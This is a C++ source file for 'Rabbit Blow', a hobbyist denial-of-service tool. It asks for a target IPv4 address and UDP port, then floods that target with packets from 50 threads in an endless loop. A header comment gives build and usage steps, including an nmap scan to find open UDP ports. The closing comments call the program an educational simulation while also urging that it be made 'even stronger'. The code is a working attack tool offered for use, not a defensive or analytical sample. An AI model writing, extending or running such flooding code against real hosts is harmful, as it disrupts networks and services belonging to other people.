
/* 

    @author Mousymous
    
    Created By Mousymous at November 14 2024 - November 16 2024.
    The whole code is hand written and developed so by mousymous so bugs and mistakes are visible.
    You can modify the program to make it even better.

    Issues: 

        Needs open UDP ports to work and often causes Low to None damage on a Network.
        If supplied with incorrect Input, The program will just Kicks you out or cause undefined behaviours. (fixed)
        Error messages aren't informative enough so you gotta dig deeper if errors is encountered. (fixed)

        Overall unfinished, unoptimized and Buggy but it works!.

    Fix:

        Multi-Threading Implemented now it's stronger as ever!!


    Destructive power: 
        
        Low.
        Add multi-threadin to DESTROY() function if you want it powerful lol.

    How to Build:

        Can only work in Linux and not tested for Windows Operating System.
        compile the program with g++ make sure to add optimization flag and use C++20 and pedantic errors enabled
            
        suggested compilation build:

            g++ rabbitBlow.cpp name.cpp -o rabbit-blow.exe -pedantic-errors -O3 -std=c++20

        Add this flags to enable warnings: 

            -Wall -Wextra -Weffc++ -Wconversion 
    
    How to use:

        Supply the First input with an IP address that is IPv4 version, IPv6 IP Addresses won't work
        Supply the second input with an open UDP port number

    Tips:

        Use nmap tool to check if an UDP port is open, make sure you are using sudo privilages

        Command: 

            sudo nmap -sU ( ip_target )

    Warning:

        If no open UDP port is found it won't really work and even if there's an open port
        it's not guranteed that it will work because of firewalls.

    ! I'm jut also Learning. !

*/

#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <limits>
#include <thread>
#include <vector>
#include <boost/asio.hpp>
#include <cstdint>
#include "textcolors.h"

#define COLOR REDHB
#define PORT_LIMIT 65535

// Structure to hold socket information
struct SocketInfo {
    std::int8_t socket; // The socket file descriptor
};

// Structure to hold user-inputted target data (IP address and port)
struct StoredData {
    std::string targetIpAddress; // Target IP address to connect to
    std::uint16_t targetPortNumber; // Target port number to connect to
};

// Class to display the logo of the tool
class DisplayLogo {
    public:
        // Constructor that takes the tool's name as an argument
        DisplayLogo(const std::string& rabbitBlowLogo) {
            std::cout << rabbitBlowLogo << std::endl;
        }
};

// Class to take user input and validates if it's valid
class GetUserInput {

    public:

        // Constructor that will execute the function that will fetch user inputs

        GetUserInput(struct StoredData& storedDataObj) {
            fetchUserInput(storedDataObj); 
        };

    private:

        // Structure to stores temporary IP Address and PORT Number inputs from user for checking validation.
    
        struct StoredInput {

            std::string inputipAddress;
            std::uint16_t inputPortNumber; // uses int type std::uint16_t because unsigned short 16 bit int contains the exact numbers of available ports

        };

        // Enumerate machine state, which stores each state checkValidInput() function will be in upon input validation
        // why add this feature? so in future changes it's more easier to add states whenever new inputs will be added

        typedef enum {

            IP_ADDRESS_STATE,
            PORT_NUMBER_STATE

        } InputState;


        // checkValidInput() function checks whenever given input is valid
        // it also takes 2 parameters which the first one is checking the state and
        // the other for accessing the stored input from the StoredInput structure

        void checkValidInput(InputState& inputState_IS, struct StoredInput& storedInput) {

            // This switch-case statement checks which state this function will be in, whenever checking the IP address or Port number?

           switch(inputState_IS) {

                case (IP_ADDRESS_STATE):

                     // This State Checks if the given IP Address is Valid, Because the IP address is a string. i used a
                     // boost::asio::ip::address::from_string() predefined function from boost header (which is not a standard header of C++)
                     // to check it, remember to compile it with -lboost_system to work    

                    try {
        
                        boost::asio::ip::address::from_string(storedInput.inputipAddress);

                    } catch (boost::system::system_error&) {

                        std::cerr << COLOR "IP ADDRESS IS INVALID CHILL TYPE SLOW OR MAYBE YOU're TARGET DOESNT EXIST?" reset;
                        exit(EXIT_FAILURE);
                    }
                    
                    break;

                case (PORT_NUMBER_STATE):

                    // This state checks if the given PORT number is valid.
                    // One is for checking if the given input is a number.
                    // Second is for checking if the input is less than 0 (because using 0 as a port is invalid) 
                    // and if the port number is greater than PORT_LIMIT (conatins 65535 because this is ho many the ports in our mordern system)


                    if (std::cin.fail()) {

                         // Checks if PORT Number is a Number !
                        std::cerr << COLOR "YOU MORON THAT'S NOT A PORT NUMBER WHAT ARE YOU A SKID?" reset << std::endl;
                        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                        std::cin.clear();
                        exit(EXIT_FAILURE);
                    }

                    if (storedInput.inputPortNumber < 0 || storedInput.inputPortNumber > PORT_LIMIT){
                        
                        // Checks if PORT Number is in right radius!
 
                        std::cerr << COLOR "STUDY COMPUTER NETWORKING KIDDO, THAT IS NOT A PORT NUMBER!" reset << std::endl;
                        exit(EXIT_FAILURE);
                    }

                    break;
           }
        }


        // getIpTarget() now have 2 parameters, one for passing the machine state and other 
        // for the structure that stores the temporary user input
        // also it prompts the user to enter target IP Address

        std::string getIpTarget(InputState inputState_IP, struct StoredInput& storedInput) { 

            std::cout << COLOR "Enter Target IP: " reset;
            std::getline(std::cin, storedInput.inputipAddress);
            checkValidInput(inputState_IP, storedInput); 

            return storedInput.inputipAddress; 
        }


        // getPortNumber() also have 2 parameter one for passing the machine state and other 
        // for the structure that stores the temporary user input
        // Also prompts the user to enter the target port number

        int getPortTarget(InputState inputState_Port, struct StoredInput& storedInput) {

            std::cout << COLOR "Enter Target Port Number: " reset; 
            std::cin >> storedInput.inputPortNumber; 
            std::cin.ignore();

            checkValidInput(inputState_Port, storedInput);

            return storedInput.inputPortNumber;
        }

        // Method to get both the target IP address and port number from the user
        // and passes the state on each respective function and also supplies the functions an access to
        // the StoredData structure
        void fetchUserInput(struct StoredData& storedDataObj) {

            struct StoredInput storedInput = { "" , 0 };

            storedDataObj.targetIpAddress = getIpTarget(IP_ADDRESS_STATE, storedInput); 
            storedDataObj.targetPortNumber = getPortTarget(PORT_NUMBER_STATE, storedInput);
        }
};



// Class to configure the socket and prepare it for communication
class SocketConfig {
    public:
        // Constructor that initializes the socket and binds it to the target IP and port
        SocketConfig(struct SocketInfo& socketInfoObj, struct sockaddr_in& victimAddr, struct StoredData& storedDataObj) {
            socketInitialization(socketInfoObj.socket); // Calls socket initialization
            socketBind(victimAddr, storedDataObj); // Binds the socket to the target IP and port
        }

        // Initializes the socket for communication
        void socketInitialization(int8_t& sockfd) {
            if ( (sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0 ) {
                std::cerr << BRED "Socket failed to initialize" << std::endl; // Displays error if socket creation fails
                exit(EXIT_FAILURE); // Exit program with failure
            }
        }

        // Binds the socket to the target IP address and port number
        void socketBind(struct sockaddr_in& victimAddr, struct StoredData& storedDataObj) {
            memset(&victimAddr, 0, sizeof(victimAddr)); // Clears memory for sockaddr_in structure
            victimAddr.sin_family = AF_INET; // Sets the socket family to IPv4
            victimAddr.sin_port = htons(static_cast<uint16_t>(storedDataObj.targetPortNumber)); // Sets the target port (converted to network byte order)

            // Converts the target IP address from text to binary format
            if(inet_pton(AF_INET, storedDataObj.targetIpAddress.c_str(), &victimAddr.sin_addr) <= 0) {
                std::cerr << BRED "Invalid IP Address Format" << std::endl; // Error if IP format is invalid
                exit(EXIT_FAILURE); // Exit the program with failure
            }

            std::cout << "Working!!" << std::endl; // Confirmation message
        }
};

/*
    ! The Attack Begins Here

    This class performs the destructive operation (attack), sending UDP packets to the target IP.
*/ 
class Kill_em_ALL {
    public:

        // Constructor that starts the destructive operation
        Kill_em_ALL(struct SocketInfo& sockInfoObj, struct sockaddr_in& victimAddr) {

            // ! SELF C'MON, REFACTOR THIS IT LOOKS UGLY

            const std::uint16_t NumberOfThreads {50};   // Number of Threads to be made
            std::vector<std::thread> threads;           // A vector of thread type to store threads that will hold DESTROY() function

            for(int i = 0; i < NumberOfThreads; i++) {  // A Loop to make Threads that will execute DESTROY()

                // Threads that runs DESTROY() function is being made and stored in the vector 
                // std::ref() is used to pass arguments to function indicates that it passes those arguments as reference and not as copy

                threads.emplace_back(DESTROY,  std::ref(sockInfoObj), std::ref(victimAddr));  
                std::cout << "Rabbit Instance is Made ";
            }

              // Loops throught the Vector that holds all the threads running DESTROY() and wait for each to join()
              // This loop prevents the program from exiting

            for(auto& thread : threads) { 
                thread.join();
            }
        }
        
        // Method to send destructive packets to the target continuously
        static void DESTROY(struct SocketInfo& sockInfoObj, struct sockaddr_in& victimAddr) {    
            std::string data_to_transfer = "RABITS ARE INVADING THEY ARE ATTACKING YOUR NETWORK!!!!!!"; // Message to send

            while (true) {
                // Sends the message to the target IP and port
                ssize_t byteSent = sendto(sockInfoObj.socket, data_to_transfer.c_str(), data_to_transfer.size(), 0,
                                          (struct sockaddr *)&victimAddr, sizeof(victimAddr));

                if (byteSent < 0) { // If message sending fails
                    std::cerr << BRED "Failed to send message! Error: " << strerror(errno) << std::endl; // Error message
                    close(sockInfoObj.socket); // Closes the socket
                    exit(EXIT_FAILURE); // Exit with failure
                }

                // Displays the attack progress message
                std::cout << BRED" ThE RaBBiTs " BBLU "ArE On " BYEL " To BrEaK ThE " BMAG " SYsTEm! ";
            }

            close(sockInfoObj.socket); // Closes the socket after the loop
        }
};

// Main function to start the program
int main([[maybe_unused]]int argc, [[maybe_unused]] char **argv) {

    extern const std::string rabbitBlowLogo;
    struct sockaddr_in victimAddr; // Address structure for the target

    struct SocketInfo socketInfoObj = { 0 }; // Initializes the socket info structure
    struct StoredData storedDataObj = { " " , 0 }; // Initializes the stored data structure with default values

    // Display tool name (logo)
    DisplayLogo displayLogoObj(rabbitBlowLogo); 

    // Get user input for target IP and port
    GetUserInput getUserInputObj(storedDataObj); 

    // Configure the socket for communication
    SocketConfig socketConfigObj(socketInfoObj, victimAddr, storedDataObj); 

    // Start the destructive operation
    Kill_em_ALL(socketInfoObj, victimAddr);

    return EXIT_SUCCESS; // Exit the program with success
}

/* 
    This program simulates a network attack using UDP packets. It is designed for educational purposes only. 

    **How the program works:**
    
    Display the Tool's Logo:

       - The program starts by displaying the name of the tool (or logo) using the `DisplayLogo` class. The logo is displayed via the `DisplayToolName()` method in this class, which outputs the tool name to the console.


    User Input (Target IP and Port):

       - The `UserInput` class handles collecting the target IP address and port number from the user. The constructor calls the `getUserInput()` method, which internally calls two methods:
         - `getIpTarget()`: Asks the user to input the target IP address (e.g., "192.168.1.1").
         - `getPortTarget()`: Asks the user to input the target port number (e.g., "8080").

       - Both methods ensure that the input is valid by calling `checkValidInput()`. 

            Checks for valid IP Address.
            Checks for valid Port Number.

    Socket Initialization:


       - The `SocketConfig` class is responsible for setting up the network socket. The constructor of this class initializes the socket using the 
        `socketInitialization()` method, which calls the system call `socket()` to create a UDP socket.
       - If socket creation fails, an error message is displayed, and the program exits. The `socket()` function is used here to set up a socket for **UDP communication** (`SOCK_DGRAM`).

    Binding the Socket:

       - After the socket is created, the `socketBind()` method configures the socket with the target IP address and port. It uses the `inet_pton()` 
        function to convert the target IP address from text to binary format (network byte order).
       - The `htons()` function is used to convert the target port number into the proper network byte order.
       - The socket is not explicitly bound to a local address since this is a **client-side operation**, and binding is unnecessary for UDP in this case.

    Starting the Attack (Send UDP Packets):


       - The `Kill_em_ALL` class simulates a **denial-of-service (DoS) attack** by continuously sending UDP packets to the target using the `sendto()` system call.
       - The attack message `"RABITS ARE INVADING THEY ARE ATTACKING YOUR NETWORK!!!!!!"` is sent in each UDP packet.
       - The `DESTROY()` method continuously loops, sending the packet to the target address (`victimAddr`) using the socket created earlier. If sending the packet
         fails (e.g., due to a network error), an error message is displayed, and the socket is closed.
       - The loop continues indefinitely, sending the message and printing progress output to the console. The message simulates an attack with some playful text (e.g., "ThE RaBBiTs ArE On To BrEaK ThE SyStEm!").
       - Used Multi-Threading to multiply packet sending to further more distrupt the System effectively

        note:

            future changes may be added to make it even stronger.

    Program Execution Flow:

       - The program starts by displaying the logo, then asks the user for the target IP and port.
       - It initializes a socket and configures it to communicate with the target IP and port.
       - Finally, it starts the attack by continuously sending the UDP packets to the target.

    Main Points to Note:

    - This program uses the `sendto()` function to send UDP packets. Since UDP is connectionless, the program does not establish a connection with the target before sending data.
    - The socket is set to use IPv4 (AF_INET) and UDP (SOCK_DGRAM).
    - The attack message is sent in a loop, simulating a DoS (Denial-of-Service) type of network attack. The message is hardcoded and does not actually perform any harmful activity besides flooding the target with packets.
    - The code handles errors such as invalid user input, socket creation failure, and failed packet transmission.

    Things to Remember:

    - The program is an example for understanding socket programming and how data can be sent over a network.
    - The program now has multi-threading support for sending multiple instances of the message concurrently,
      which could improve performance in an actual attack scenario.



    Note for Aurhor:

        Make it as even as more powerful!!
*/
